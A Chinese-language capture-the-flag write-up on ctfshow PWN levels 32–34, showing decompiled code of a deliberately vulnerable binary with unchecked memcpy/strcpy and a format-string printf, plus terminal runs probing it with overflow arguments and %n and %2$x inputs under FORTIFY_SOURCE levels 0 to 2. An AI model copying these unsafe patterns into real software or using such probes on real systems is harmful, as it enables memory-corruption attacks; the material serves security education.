<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">...</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ ./pwnme aaaaaa bbbbb ccccc ddddd</span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">* Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">* Type  : Linux_Security_Mechanisms     </span></span><br><span class="line"><span class="string">* Site  : https://ctf.show/    </span></span><br><span class="line"><span class="string">* Hint  : FORTIFY 0 1 2   </span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">aaaaaa CTFshowPWN</span></span><br><span class="line"><span class="string">aaaaaa aaaaaa</span></span><br><span class="line"><span class="string">aaaaaa</span></span><br><span class="line"><span class="string">aaaaaa</span></span><br><span class="line"><span class="string">The source code of these three programs is the same, and the results of turning on different levels of protection are understood</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should understand the role of these protections!But don&#x27;</span>t just get a flag</span><br><span class="line">Here is your flag:</span><br><span class="line"></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-15"><a href="#分析过程：-15" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br></pre></td></tr></table></figure>

<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> egid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  egid = getegid();</span><br><span class="line">  setresgid(egid, egid, egid);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  n = strtol(argv[<span class="number">3</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf1, argv[<span class="number">2</span>], n);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，第一题关闭了此保护，输入的argv1明显会导致buf1溢出，但是程序仍可以正常运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaaaa CTFshowPWN</span><br><span class="line">a aaaaaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span></span><br><span class="line">fbad2288</span><br></pre></td></tr></table></figure>

<p>而在本题需要获取flag，仅仅需要关注到最后的Undefined函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000092A                 public Undefined</span><br><span class="line">.text:000000000000092A Undefined       proc near               ; CODE XREF: main+117↓p</span><br><span class="line">.text:000000000000092A</span><br><span class="line">.text:000000000000092A flag            = byte ptr -48h</span><br><span class="line">.text:000000000000092A</span><br><span class="line">.text:000000000000092A ; __unwind &#123;</span><br><span class="line">.text:000000000000092A                 push    rbx</span><br><span class="line">.text:000000000000092B                 sub     rsp, 40h</span><br><span class="line">.text:000000000000092F                 lea     rdi, s          ; &quot;The source code of these three programs&quot;...</span><br><span class="line">.text:0000000000000936                 call    _puts</span><br><span class="line">.text:000000000000093B                 lea     rdi, aYouShouldUnder ; &quot;You should understand the role of these&quot;...</span><br><span class="line">.text:0000000000000942                 call    _puts</span><br><span class="line">.text:0000000000000947                 lea     rsi, modes      ; &quot;r&quot;</span><br><span class="line">.text:000000000000094E                 lea     rdi, filename   ; &quot;/ctfshow_flag&quot;</span><br><span class="line">.text:0000000000000955                 call    _fopen</span><br><span class="line">.text:000000000000095A f = rax                                 ; FILE *</span><br><span class="line">.text:000000000000095A                 test    f, f</span><br><span class="line">.text:000000000000095D                 jz      short loc_980</span><br><span class="line">.text:000000000000095F                 mov     rbx, rsp</span><br><span class="line">.text:0000000000000962                 mov     rdx, f          ; stream</span><br><span class="line">.text:0000000000000965                 mov     esi, 40h ; &#x27;@&#x27;  ; n</span><br><span class="line">.text:000000000000096A                 mov     rdi, rbx        ; s</span><br><span class="line">.text:000000000000096D                 call    _fgets</span><br><span class="line">.text:0000000000000972                 mov     rdi, rbx        ; s</span><br><span class="line">.text:0000000000000975                 call    _puts</span><br><span class="line">.text:000000000000097A                 add     rsp, 40h</span><br><span class="line">.text:000000000000097E                 pop     rbx</span><br><span class="line">.text:000000000000097F                 retn</span><br><span class="line">.text:0000000000000980 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000980</span><br><span class="line">.text:0000000000000980 loc_980:                                ; CODE XREF: Undefined+33↑j</span><br><span class="line">.text:0000000000000980 f = rax                                 ; FILE *</span><br><span class="line">.text:0000000000000980                 lea     rdi, aCtfshowFlagNoS ; &quot;/ctfshow_flag: No such file or director&quot;...</span><br><span class="line">.text:0000000000000987                 call    _puts</span><br><span class="line">.text:000000000000098C                 mov     edi, 0          ; status</span><br><span class="line">.text:0000000000000991                 call    _exit</span><br><span class="line">.text:0000000000000991 ; &#125; // starts at 92A</span><br><span class="line">.text:0000000000000991 Undefined       endp</span><br></pre></td></tr></table></figure>

<p>同样的它将flag打开并打印出来</p>
<p>这里仅仅有一个判断你输入的参数是否大于4，当大于4时即可拿到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaaaaa bbbbbbbbbbbb 6 flag</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaaaa CTFshowPWN</span><br><span class="line">a aaaaaaaaaaaa</span><br><span class="line">%p</span><br><span class="line">0x7fffffffe354</span><br><span class="line">The <span class="built_in">source</span> code of these three programs is the same, and the results of turning on different levels of protection are understood</span><br><span class="line"></span><br><span class="line">You should understand the role of these protections!But don<span class="string">&#x27;t just get a flag</span></span><br><span class="line"><span class="string">Here is your flag:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;#本地flag</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint：FORTIFY_SOURCE=1：启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。</span><br><span class="line">	 ssh ctfshow@pwn.challenge.ctf.show -p28177</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">...</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ ./pwnme aaaaaaaa bbbbbbbb ccccccc 6 flag</span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">* Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">* Type  : Linux_Security_Mechanisms     </span></span><br><span class="line"><span class="string">* Site  : https://ctf.show/    </span></span><br><span class="line"><span class="string">* Hint  : FORTIFY 0 1 2   </span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">aaaaaaaa CTFshowPWN</span></span><br><span class="line"><span class="string">aaaaaaaa aaaaaaaa</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">The source code these three programs is the same, and the results of turning on different levels of protection are understood</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should understand the role of these protections!But don&#x27;</span>t just get a flag</span><br><span class="line">Here is your flag:</span><br><span class="line"></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-16"><a href="#分析过程：-16" class="headerlink" title="分析过程："></a>分析过程：</h6><p>FORTIFY_SOURCE&#x3D;1：</p>
<p>checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  FORTIFY:    Enabled  </span><br></pre></td></tr></table></figure>

<p>可以看到现在检测到开启了FORTIFY保护了</p>
<p>IDA查看源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> egid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  egid = getegid();</span><br><span class="line">  setresgid(egid, egid, egid);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v5 = strtol(argv[<span class="number">3</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  __memcpy_chk(buf1, argv[<span class="number">2</span>], v5, <span class="number">11</span>);</span><br><span class="line">  __strcpy_chk(buf2, argv[<span class="number">1</span>], <span class="number">11</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到之前的一些危险函数已经被替换成了安全函数，并且在程序运行时进行检查，此时传入的</p>
<p>argv1就触发了检查，抛出异常。同时格式化字符串%2$x和%n依旧可用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line"></span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%n</span><br><span class="line"></span><br><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span></span><br><span class="line">fbad2288</span><br></pre></td></tr></table></figure>

<h2 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hint：FORTIFY_SOURCE=2：启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</span><br><span class="line">	 ssh ctfshow@pwn.challenge.ctf.show -p28177</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">...</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ $ ./pwnme aaaaa bbbbb ccccc 6 flag</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">    * Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">    * Type  : Linux_Security_Mechanisms</span></span><br><span class="line"><span class="string">    * Site  : https://ctf.show/</span></span><br><span class="line"><span class="string">    * Hint  : FORTIFY 0 1 2</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">aaaaa CTFshowPWN</span></span><br><span class="line"><span class="string">aaaaa aaaaa</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">The source code of these three programs is the same, and the results of turning on different levels of protection are understood</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should understand the role of these protections!But don&#x27;</span>t just get a flag</span><br><span class="line">Here is your flag:</span><br><span class="line"></span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-17"><a href="#分析过程：-17" class="headerlink" title="分析过程："></a>分析过程：</h6><p>FORTIFY_SOURCE&#x3D;2：</p>
<p>checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  FORTIFY:    Enabled</span><br><span class="line">  Stripped:   No</span><br><span class="line">  Debuginfo:  Yes</span><br></pre></td></tr></table></figure>

<p>开启了FORTIFY保护，这次等级为2，在这无法体现出</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-2Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-23h] BYREF</span></span><br><span class="line"></span><br><span class="line">  logo();</span><br><span class="line">  v3 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v3;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v3 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v3[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  v4 = strtol(argv[<span class="number">3</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  __memcpy_chk(buf1, argv[<span class="number">2</span>], v4, <span class="number">11</span>);</span><br><span class="line">  __strcpy_chk(buf2, argv[<span class="number">1</span>], <span class="number">11</span>);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, buf1, &amp;num);</span><br><span class="line">  Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在IDA中能看到将printf函数也替换成了安全函数，那么格式化字符串%n也无法利用了，而%N$也</p>
<p>要从%1$开始连续才可用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%n</span><br><span class="line">*** %n <span class="keyword">in</span> writable segment detected ***</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span></span><br><span class="line">*** invalid %N$ use detected ***</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">$ ./pwn aaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaa CTFshowPWN</span><br><span class="line">bbbbbbaaa aaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span>%1<span class="variable">$x</span></span><br><span class="line">25782432ffffe384</span><br><span class="line">The <span class="built_in">source</span> code of these three programs is the same, and the results of turning on different levels of protection are understood</span><br><span class="line"></span><br><span class="line">You should understand the role of these protections!But don<span class="string">&#x27;t just get a flag</span></span><br><span class="line"><span class="string">Here is your flag:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br></pre></td></tr></table></figure>









































































































</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://rhea006.github.io">Rhea</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://rhea006.github.io/2025/07/d3c259498976.html">https://rhea006.github.io/2025/07/d3c259498976.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://rhea006.github.io" target="_blank">Rhea's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/w4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/fc81dbb2cd60.html" title="Ubuntu18.04本地搭建环境"><img class="cover" src="/img/w7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Ubuntu18.04本地搭建环境</div></div><div class="info-2"><div class="info-item-1">1. 更新系统和安装基本依赖首先确保系统是最新的，并安装必要的编译工具和依赖库： sudo apt update &amp;&amp; sudo apt upgrade -ysudo apt install build-essential python3 python3-pip git gdb gdb-multiarch libc6-dbg libffi-dev libssl-dev 2. 安装 pwntools（Pwn 开发库）pwntools 是 Python 编写的用于二进制漏洞利用开发的强大库，我们将在虚拟环境中安装它： # 创建并激活 Python 虚拟环境sudo apt-get install python3-venvpython3 -m venv pwn_envsource pwn_env/bin/activate# 在虚拟环境中安装 pwntoolspip install --upgrade pippip install pwntools 3. 安装 pwndbg（GDB 增强工具）cd ~git clone https://github.com/pwndbg/...</div></div></div></a><a class="pagination-related" href="/2025/07/deec9f9547c3.html" title="pwn1-4"><img class="cover" src="/img/w1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">pwn1-4</div></div><div class="info-2"><div class="info-item-1">Test_your_ncpwn1Hint：提供一个后门函数，连上即可得到flag 远程：nc ip 端口即可打通  本地： checksec检查保护 $ chmod +x pwn$ checksec  pwn  Arch:     amd64-64-little  RELRO:    Full RELRO  Stack:    No canary found  NX:       NX enabled  PIE:      PIE enabled  64位仅关闭Canary保护 用64位IDA打开查看main函数（按F5进入反汇编或者Tab键） int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setvbuf(_bss_start, 0, 2, 0);  setvbuf(stdin, 0, 2, 0);  puts(s);  puts(asc_950);  puts(asc_9D0);  puts(asc_A60);  puts(asc_AF0);  puts(asc_B78); ...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn5"><span class="toc-number">1.1.</span> <span class="toc-text">pwn5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn6"><span class="toc-number">1.2.</span> <span class="toc-text">pwn6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn7"><span class="toc-number">1.3.</span> <span class="toc-text">pwn7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn8"><span class="toc-number">1.4.</span> <span class="toc-text">pwn8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn9"><span class="toc-number">1.5.</span> <span class="toc-text">pwn9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn10"><span class="toc-number">1.6.</span> <span class="toc-text">pwn10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn11"><span class="toc-number">1.7.</span> <span class="toc-text">pwn11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn12"><span class="toc-number">1.8.</span> <span class="toc-text">pwn12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn13"><span class="toc-number">1.9.</span> <span class="toc-text">pwn13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn14"><span class="toc-number">1.10.</span> <span class="toc-text">pwn14</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.10.0.0.0.1.</span> <span class="toc-text">分析过程</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn15"><span class="toc-number">1.11.</span> <span class="toc-text">pwn15</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.11.0.0.0.1.</span> <span class="toc-text">分析过程</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn16"><span class="toc-number">1.12.</span> <span class="toc-text">pwn16</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-2"><span class="toc-number">1.12.0.0.0.1.</span> <span class="toc-text">分析过程:</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn17"><span class="toc-number">1.13.</span> <span class="toc-text">pwn17</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.13.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn18"><span class="toc-number">1.14.</span> <span class="toc-text">pwn18</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">1.14.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn19"><span class="toc-number">1.15.</span> <span class="toc-text">pwn19</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-number">1.15.0.0.0.1.</span> <span class="toc-text">分析过程：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn20"><span class="toc-number">1.16.</span> <span class="toc-text">pwn20</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" 